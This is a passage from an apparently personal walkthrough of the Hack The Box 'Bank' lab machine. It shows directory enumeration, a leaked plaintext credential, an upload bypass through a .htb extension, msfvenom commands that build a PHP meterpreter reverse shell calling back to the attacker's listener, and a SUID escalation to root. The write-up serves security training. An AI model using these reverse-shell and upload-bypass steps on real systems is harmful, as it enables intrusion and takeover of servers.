[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/top: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/23: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/terms: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/i: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/17: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/27: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/legal: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/30: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/inc (Status: 301)
/server-status (Status: 403)
/balance-transfer (Status: 301)
===============================================================
2021/01/31 15:20:10 Finished
===============================================================
```
Interesting. We now know there are `/uploads`, `/assets`, `/inc`, `/server-status`, as well as `/balance-transfer`.

Now going to our browser, we are going to try each one of these extensions.

`http://bank.htb/uploads/`
![Uploads](https://user-images.githubusercontent.com/21957042/113509934-b1721000-958a-11eb-9941-d75e846bff83.png)

`http://bank.htb/assets/`
![Assets](https://user-images.githubusercontent.com/21957042/113509923-acad5c00-958a-11eb-99d0-0b51267b0e2c.png)

`http://bank.htb/inc/`
![Inc](https://user-images.githubusercontent.com/21957042/113509927-ae771f80-958a-11eb-9785-978f229f9414.png)

`http://bank.htb/server-status/`
![ServerStatus](https://user-images.githubusercontent.com/21957042/113509931-b040e300-958a-11eb-9e94-a8d97a39011a.png)

`http://bank.htb/balance-transfer`
![balance_transfer](https://user-images.githubusercontent.com/21957042/113509924-adde8900-958a-11eb-86e6-aa33de0a0fa5.png)
```
-> Index of /balance-transfer
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	0a0b2b566c723fce6c5dc9544d426688.acc	2017-06-15 09:50 	583 	 
[ ]	0a0bc61850b221f20d9f356913fe0fe7.acc	2017-06-15 09:50 	585 	 
[ ]	0a2f19f03367b83c54549e81edc2dd06.acc	2017-06-15 09:50 	584 	 
[ ]	0a629f4d2a830c2ca6a744f6bab23707.acc	2017-06-15 09:50 	584 	 
[ ]	0a9014d0cc1912d4bd93264466fd1fad.acc	2017-06-15 09:50 	584 	 
[ ]	0ab1b48c05d1dbc484238cfb9e9267de.acc	2017-06-15 09:50 	585 	 
[ ]	0abe2e8e5fa6e58cd9ce13037ff0e29b.acc	2017-06-15 09:50 	583 	 
[ ]	0b6ad026ef67069a09e383501f47bfee.acc	2017-06-15 09:50 	585 	 
[ ]	0b59b6f62b0bf2fb3c5a21ca83b79d0f.acc	2017-06-15 09:50 	584 	 
[ ]	0b45913c924082d2c88a804a643a29c8.acc	2017-06-15 09:50 	584 	 
[ ]	0be866bee5b0b4cff0e5beeaa5605b2e.acc	2017-06-15 09:50 	584 	 
[ ]	0c04ca2346c45c28ecededb1cf62de4b.acc	2017-06-15 09:50 	585 	 
[ ]	0c4c9639defcfe73f6ce86a17f830ec0.acc	2017-06-15 09:50 	584 	  
... 
[ ]	39095d3e086eb29355d37ed5d19a9ed0.acc	2017-06-15 09:50 	583 	 
[ ]	42261debb6bdfc4d709d424616bc18cc.acc	2017-06-15 09:50 	583 	 
[ ]	44987d36fe627d12501b25116c242318.acc	2017-06-15 09:50 	584 	 
[ ]	45028a24c0a30864f94db632bca0a351.acc	2017-06-15 09:50 	585 	 
[ ]	47171c38422e049e50532e6606fa932d.acc	2017-06-15 09:50 	584 	 
[ ]	49206d1e18aa8eb1c64dae4741639b2f.acc	2017-06-15 09:50 	585 	 
[ ]	50276beac1f014b64b19dbd0e7c6bb1a.acc	2017-06-15 09:50 	584 	 
[ ]	54656a84fec49d5da07f25ee36b298bd.acc	2017-06-15 09:50 	584 	 
[ ]	56215edb6917e27802904037da00a977.acc	2017-06-15 09:50 	584 	 
[ ]	59829e0910101366d704a85f11cfdd15.acc	2017-06-15 09:50 	584 	 
[ ]	66284d79b5caa9e6a3dd440607b3fdd7.acc	2017-06-15 09:50 	584 	 
[ ]	68576f20e9732f1b2edc4df5b8533230.acc	2017-06-15 09:50 	257 	 
[ ]	75942bd27ec22afd9bdc8826cc454c75.acc	2017-06-15 09:50 	584 	 
[ ]	76123b5b589514bc2cb1c6adfb937d13.acc	2017-06-15 09:50 	584 	 
[ ]	80416d8aaea6d6cf3dcec95780fda17d.acc	2017-06-15 09:50 	585 	 
[ ]	85006f1266226e84efb919908d5f8333.acc	2017-06-15 09:50 	583 	 
[ ]	87831b753b8530fddc74e73ca8515a50.acc	2017-06-15 09:50 	585 	 
[ ]	91249b887c7bf3f6cb7becc0c0ab8ddd.acc	2017-06-15 09:50 	584 	 
[ ]	94290d34dec7593ce7c5632150a063d2.acc	2017-06-15 09:50 	585 	 
[ ]	301120b456a3b5981f5cdc9d484f1b3b.acc	2017-06-15 09:50 	585 	 
[ ]	430547d637347d0da78509b774bb9fdf.acc	2017-06-15 09:50 	584 	 
[ ]	453500e8ebb7e50f098068d998db0090.acc	2017-06-15 09:50 	583 	 
[ ]	632416bbd8eb4a3480297ea3875ea568.acc	2017-06-15 09:50 	584 	 
[ ]	640087eae263bd45eb444767ead7dd65.acc	2017-06-15 09:50 	585 	 
[ ]	756431ad587f462168df5064b3b829a8.acc	2017-06-15 09:50 	584 	 
[ ]	874792fab530aed50b38b26f2a8c1870.acc	2017-06-15 09:50 	584
...
[ ]	fcb78e263fc7d6e296494e5be897a394.acc	2017-06-15 09:50 	584 	 
[ ]	fdce9437d341e154702af5863bc247a8.acc	2017-06-15 09:50 	585 	 
[ ]	fe8a8b0081b6d606d6e85501064f1cc4.acc	2017-06-15 09:50 	585 	 
[ ]	fe9ffc658690f0452cd08ab6775e62da.acc	2017-06-15 09:50 	582 	 
[ ]	fe85ff58d546f676f0acd7558e19d6ce.acc	2017-06-15 09:50 	584 	 
[ ]	fe426e8d4c7453a99ef7cd99cf72ac03.acc	2017-06-15 09:50 	584 	 
[ ]	feac7aa0f309d8c6fa2ff2f624d2914b.acc	2017-06-15 09:50 	584 	 
[ ]	fed62d2afc2793ac001a36f0092977d7.acc	2017-06-15 09:50 	584 	 
[ ]	fedae4fd371fa7d7d4ba5c772e84d726.acc	2017-06-15 09:50 	585 	 
[ ]	ff8a6012cf9c0b6e5957c2cc32edd0bf.acc	2017-06-15 09:50 	585 	 
[ ]	ff39f4cf429a1daf5958998a7899f3ec.acc	2017-06-15 09:50 	584 	 
[ ]	ffc3cab8b54397a12ca83d7322c016d4.acc	2017-06-15 09:50 	584 	 
[ ]	ffdfb3dbd8a9947b21f79ad52c6ce455.acc	2017-06-15 09:50 	584 	 
Apache/2.4.7 (Ubuntu) Server at bank.htb Port 80
```
Wow, there are so many files in `http://bank.htb/balance-transfer`.

Let's inspect 1 file for example and see what we get.
```
http://bank.htb/balance-transfer/0a0b2b566c723fce6c5dc9544d426688.acc

++OK ENCRYPT SUCCESS
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: czeCv3jWYYljNI2mTedDWxNCF37ddRuqrJ2WNlTLje47X7tRlHvifiVUm27AUC0ll2i9ocUIqZPo6jfs0KLf3H9qJh0ET00f3josvjaWiZkpjARjkDyokIO3ZOITPI9T
Email: 1xlwRvs9vMzOmq8H3G5npUroI9iySrrTZNpQiS0OFzD20LK4rPsRJTfs3y1VZsPYffOy7PnMo0PoLzsdpU49OkCSSDOR6DPmSEUZtiMSiCg3bJgAElKsFmlxZ9p5MfrE
Password: TmEnErfX3w0fghQUCAniWIQWRf1DutioQWMvo2srytHOKxJn76G4Ow0GM2jgvCFmzrRXtkp2N6RyDAWLGCPv9PbVRvbn7RKGjBENW3PJaHiOhezYRpt0fEV797uhZfXi
CreditCards: 5
Transactions: 93
Balance: 905948 .
```
Now, this is interesting. Encrypted credentials.

NOTE: There is an [alternative method](https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-bank/), bypassing `balance-transfer`
altogether and utilizing a redirect flaw, gaining access to the support page.

## 8. Exploitating Unencrypted Credentials
I got lost here yet again, and had to look up for writeups again.

Turns out, one of these files is not like the other. Instead of having a size of either 583 or 584, it is much smaller and has a size of 257 due to failed encryption. We can sort by size to find this file.
```
[ ]	68576f20e9732f1b2edc4df5b8533230.acc	2017-06-15 09:50 	257 	 

http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc

--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```
We shall use these credentials to log in to `http://bank.htb/login.php`.

Upon logging in successfully, we can see his balance, transactions, and credit cards.

![LoggedIn](https://user-images.githubusercontent.com/21957042/113509929-af0fb600-958a-11eb-8a05-25b33c00c4e5.png)

More importantly, we are able to see a Support page which we can upload files. However, since we were unable to access `http://bank.htb/uploads/`, it'd be useless since we would not be able to execute our payload.

![SupportPage](https://user-images.githubusercontent.com/21957042/113509932-b0d97980-958a-11eb-88fc-6ab0d2a33178.png)

Yet again, I am lost since this is the first exercise where we do not use known exploits.

## 9. PHP Payload
The clue was to look at the page source of the support page.

![PageSource](https://user-images.githubusercontent.com/21957042/113509930-afa84c80-958a-11eb-92af-58388c6b531d.png)

```
<!DOCTYPE html>
<html>
  <head>
    <title>HTB Bank - Support</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Bootstrap -->
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <!-- styles -->
    <link href="./assets/css/theme/styles.css" rel="stylesheet">
    <!-- SweetAlert -->
    <link rel="stylesheet" type="text/css" href="./assets/css/sweetalert.css">
  </head>
  <body>
...

        <div class="panel-body">
            <form class="new_ticket" id="new_ticket" accept-charset="UTF-8" method="post" enctype="multipart/form-data">

                <label>Title</label>
                <input required placeholder="Title" class="form-control" type="text" name="title" id="ticket_title" style="background-repeat: repeat; background-image: none; background-position: 0% 0%;">
                <br>

                <label>Message</label>
                <textarea required placeholder="Tell us your problem" class="form-control" style="height: 170px; background-repeat: repeat; background-image: none; background-position: 0% 0%;" name="message" id="ticket_message"></textarea>
                <br>
                <div style="position:relative;">
                		<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
				        <a class='btn btn-primary' href='javascript:;'>
				            Choose File...
				            <input type="file" required style='position:absolute;z-index:2;top:0;left:0;filter: alpha(opacity=0);-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";opacity:0;background-color:transparent;color:transparent;' name="fileToUpload" size="40"  onchange='$("#upload-file-info").html($(this).val().replace("C:\\fakepath\\", ""));'>
				        </a>
				        &nbsp;
				        <span class='label label-info' id="upload-file-info"></span>
...
    <!-- Morris Charts JavaScript -->
    <script src="./assets/js/plugins/morris/raphael.min.js"></script>
    <script src="./assets/js/plugins/morris/morris.min.js"></script>
    <script src="./assets/js/plugins/morris/morris-data.js"></script>

    <!-- SweetAlert -->
    <script src="./assets/js/sweetalert.min.js"></script>

</body>

</html>
```
We spot an interesting comment that the Developer failed to remove! `<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->`, & `onchange='$("#upload-file-info").html($(this).val().replace("C:\\fakepath\\", ""));'>`. This just confirms that we could possibly go to a path and execute our PHP payload.

Let's use msfvenom to craft a PHP reverse shell!
```
hippoeug@kali:~$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.x.x LPORT=6969 -f raw > shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 30687 bytes
```
And we go back to our Support page, attaching our `shell.php` PHP reverse shell and submitting it. Unfortunately it returned with the error "You cant upload this file. You can upload only images.". 

![php1](https://user-images.githubusercontent.com/21957042/113511671-9061ed00-9593-11eb-9404-0086d4ded1e0.png)
![php2](https://user-images.githubusercontent.com/21957042/113511672-9061ed00-9593-11eb-856f-6b0f8741679a.png)

If we read the Developer's comments carefully, we realise that the file extension `.htb` is supported instead for debugging purposes.

Let's use msfvenom again to craft a PHP reverse shell, but using a HTB wrapper.
```
hippoeug@kali:~$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.x.x LPORT=6969 -f raw > shell.htb
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 30687 bytes
```
This time, we try uploading our `shell.htb` PHP reverse shell and it worked, with the message "Your ticket has been created successfully".

![htb1](https://user-images.githubusercontent.com/21957042/113511667-8dff9300-9593-11eb-9609-f3e0101ef26e.png)
![htb2](https://user-images.githubusercontent.com/21957042/113511669-8f30c000-9593-11eb-9b81-444a3bd0c7a9.png)

We now start a Meterpreter listener, and try to execute this payload.
```
msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
payload => php/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > show options
...
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.19:6969 
```
All that is left is to execute our shell, by navigating to `http://bank.htb/uploads/shell.htb`, or clicking on the Attachment (Click Here).

![open](https://user-images.githubusercontent.com/21957042/113511670-8fc95680-9593-11eb-9301-483543bc4d23.png)

```
[*] Started reverse TCP handler on 10.10.14.19:6969 
[*] Meterpreter session 1 opened (10.10.14.19:6969 -> 10.129.29.200:57404) at 2021-01-31 21:19:13 +0800

meterpreter > getuid
Server username: www-data (33)
```
This worked! We got a Meterpreter shell successfully.

## 10. Privilege Escalation & Getting Flags
Through navigating around, we got our first flag.
```
meterpreter > cd chris
meterpreter > ls
Listing: /home/chris
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
20666/rw-rw-rw-   0     cha   2021-01-31 19:56:54 +0800  .bash_history
100644/rw-r--r--  220   fil   2017-05-29 03:13:11 +0800  .bash_logout
100644/rw-r--r--  3637  fil   2017-05-29 03:13:11 +0800  .bashrc
40700/rwx------   4096  dir   2021-01-11 20:19:00 +0800  .cache
100644/rw-r--r--  675   fil   2017-05-29 03:13:11 +0800  .profile
100444/r--r--r--  33    fil   2021-01-31 19:57:12 +0800  user.txt

meterpreter > cat user.txt
45297b1116b94557e9af4033f4198615
```
Now let's try to get our system flag.

We will attempt our usual method.
```
meterpreter > getsystem
[-] Unknown command: getsystem.

meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.129.29.200 - Collecting local exploits for php/linux...
[-] 10.129.29.200 - No suggestions available.
```
Unforutantely for us, our usual method did not work.

We can use our usual method of doing more enumeration of the OS for example and finding an exploit for it.
```
meterpreter > sysinfo
Computer    : bank
OS          : Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686
Meterpreter : php/linux
```
However, this was hardly of any use. Since we know it's a Linux system, we Google for "linux privilege escalation".

There are multiple methods, but we try the first method which I've learnt in the past. SUID. Quoting our [source](https://payatu.com/guide-linux-privilege-escalation), "SUID is a feature that, when used properly, actually enhances Linux security. The problem is that administrators may unknowingly introduce dangerous SUID configurations when they install third party applications or make logical configuration changes.".

Let's give this a shot.
```
meterpreter > shell
Process 1603 created.
Channel 1 created.
        
find / -perm -u=s -type f 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```
We don't immediately see anything we could use to our untrained eye, but one does stand out. It is not normal to see files like `/var/htb/bin/emergency` having SUID privileges.

Let's explore this file.
```
meterpreter > cd /var/htb
meterpreter > ls
Listing: /var/htb
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40755/rwxr-xr-x   4096  dir   2021-01-11 20:18:58 +0800  bin
100755/rwxr-xr-x  356   fil   2017-06-14 23:30:24 +0800  emergency

meterpreter > cat emergency
#!/usr/bin/python
import os, sys

def close():
        print "Bye"
        sys.exit()

def getroot():
        try:
                print "Popping up root shell..";
                os.system("/var/htb/bin/emergency")
                close()
        except:
                sys.exit()

q1 = raw_input("[!] Do you want to get a root shell? (THIS SCRIPT IS FOR EMERGENCY ONLY) [y/n]: ");

if q1 == "y" or q1 == "yes":
        getroot()
else:
        close()
```
Ooh! This is probably quite unrealistic, but still we have learnt alot from this. Turns out if we executed this file, we would get root. 

What are we waiting for?
```
meterpreter > pwd
/var/htb/bin
meterpreter > ls
Listing: /var/htb/bin
=====================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
104755/rwxr-xr-x  112204  fil   2017-06-14 23:27:12 +0800  emergency

shell                            <-
Process 1303 created.
Channel 0 created.
./emergency                      <-
whoami 
root
ls                               <-
emergency
pwd                              <-
/var/htb/bin
cd ..                            <-
cd ..                            <-
cd ..                            <-
pwd                              <-
/
ls                               <-
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd root                          <-
ls                               <-
root.txt
cat root.txt                     <-
81b1e99576f6e62c994f77bc747929bb
```
Bim-ba-da-boom, we got ze flag!
